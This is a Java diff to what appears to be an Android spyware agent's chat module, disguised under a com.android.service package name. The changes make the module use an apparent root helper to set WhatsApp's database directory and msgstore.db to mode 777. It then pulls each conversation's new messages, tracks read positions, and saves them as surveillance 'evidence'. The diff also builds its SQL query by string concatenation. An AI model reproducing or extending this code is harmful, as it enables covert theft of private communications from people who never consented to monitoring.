@@ -3,7 +3,9 @@ package com.android.service.module;
 import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Enumeration;
 import java.util.Hashtable;
+import java.util.Iterator;
 import java.util.Vector;
 
 import android.database.Cursor;
@@ -61,12 +63,22 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			Check.log(TAG + " (actualStart)");
 		}
 		markupChat = new Markup(this);
+		hastableConversationLastIndex = new Hashtable<String, Integer>();
 		try {
-			hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
-		} catch (IOException e) {
-			hastableConversationLastIndex = new Hashtable<String, Integer>();
-		}
+			if (markupChat.isMarkup()) {
+				hastableConversationLastIndex = (Hashtable<String, Integer>) markupChat.readMarkupSerializable();
+				Enumeration<String> keys = hastableConversationLastIndex.keys();
+				
+				while(keys.hasMoreElements()){
+					String key = keys.nextElement();
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
+					}
+				}
+			}
+		} catch (Exception e) {
 
+		}
 		ListenerProcess.self().attach(this);
 	}
 
@@ -101,13 +113,15 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	// chat_list,messages where chat_list.key_remote_jid =
 	// messages.key_remote_jid
 
-	private void readChatMessages() throws IOException {
+	private synchronized void readChatMessages() throws IOException {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readChatMessages)");
 		}
 		boolean updateMarkup = false;
-		String dbFile = "/data/data/com.whatsapp/databases/msgstore.db";
+		String dbDir = "/data/data/com.whatsapp/databases";
+		String dbFile = dbDir + "/msgstore.db";
 		// changeFilePermission(dbFile,777);
+		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbDir);
 		Runtime.getRuntime().exec("/system/bin/ntpsvd pzm 777 " + dbFile);
 		File file = new File(dbFile);
 		if (file.canRead()) {
@@ -130,9 +144,10 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
-							+ " resulted " + newLastRead);
+							+ " newLastRead " + newLastRead);
 				}
 				hastableConversationLastIndex.put(conversation, newLastRead);
+				if (Cfg.DEBUG) { Check.asserts(hastableConversationLastIndex.get(conversation) > 0, " (readChatMessages) Assert failed, zero index"); }
 				updateMarkup = true;
 			}
 
@@ -142,6 +157,8 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 				}
 				markupChat.writeMarkupSerializable(hastableConversationLastIndex);
 			}
+			
+			db.close();
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
@@ -153,7 +170,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchChangedConversation)");
 		}
-		
+
 		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();
 
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
@@ -172,8 +189,12 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 
 			int lastReadIndex = 0;
 			// if conversation in known, get the last read index
-			if (hastableConversationLastIndex.contains(jid)) {
+			if (hastableConversationLastIndex.containsKey(jid)) {
+				
 				lastReadIndex = hastableConversationLastIndex.get(jid);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
+				}
 			}
 
 			// if there's something new, fetch new messages and update
@@ -183,24 +204,33 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 			}
 
 		}
-
+		cursor.close();
 		return changedConversations;
 	}
 
 	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
+		}
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		queryBuilderIndex.setTables("messages");
-		queryBuilderIndex.appendWhere("key_remote_jid = " + conversation + " AND _id > " + lastReadIndex);
+		queryBuilderIndex.appendWhere("key_remote_jid = '" + conversation + "' AND _id > " + lastReadIndex);
 		String[] projection = { "_id", "key_remote_jid", "data" };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 		ArrayList<String> messages = new ArrayList<String>();
+		int lastRead = lastReadIndex;
 		while (cursor != null && cursor.moveToNext()) {
 			String data = cursor.getString(cursor.getColumnIndexOrThrow("data"));
+			int index = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + data);
+			}
+			lastRead = Math.max(index, lastRead);
 			messages.add(data);
 		}
-
+		cursor.close();
 		saveEvidence(conversation, messages);
-		return 0;
+		return lastRead;
 	}
 
 	private void saveEvidence(String conversation, ArrayList<String> messages) {
@@ -212,9 +242,9 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		for (String message : messages) {
 
 			items.add(datetime.getStructTm());
-			items.add(WChar.getBytes(conversation, true));
+			items.add(WChar.getBytes("whatsapp", true));
 			items.add(WChar.getBytes("no topic", true));
-			items.add(WChar.getBytes(conversation, true));
+			items.add(WChar.getBytes(conversation.replaceAll("@s.whatsapp.net", ""), true));
 			items.add(WChar.getBytes(message, true));
 			items.add(Utils.intToByteArray(Evidence.E_DELIMITER));
 		}
